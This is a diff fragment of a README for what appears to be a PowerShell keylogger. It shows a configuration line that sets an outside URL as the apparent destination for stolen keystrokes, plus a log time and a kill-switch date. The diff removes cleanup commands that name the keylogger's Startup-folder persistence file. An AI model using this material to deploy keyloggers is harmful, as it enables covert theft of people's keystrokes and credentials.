@@ -71,12 +71,7 @@ $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 P
 ```
 ### DELETING THE KEYLOGGER
 
-You can use the following code to delete the keylogger 
-
-Or manually from those locations
-
-Remove-Item "$env:appdata\-locker" -Recurse -Force;
-Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
+Just hold `Left Control` + `Right Control` for 5 seconds untill the notification box pops up
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
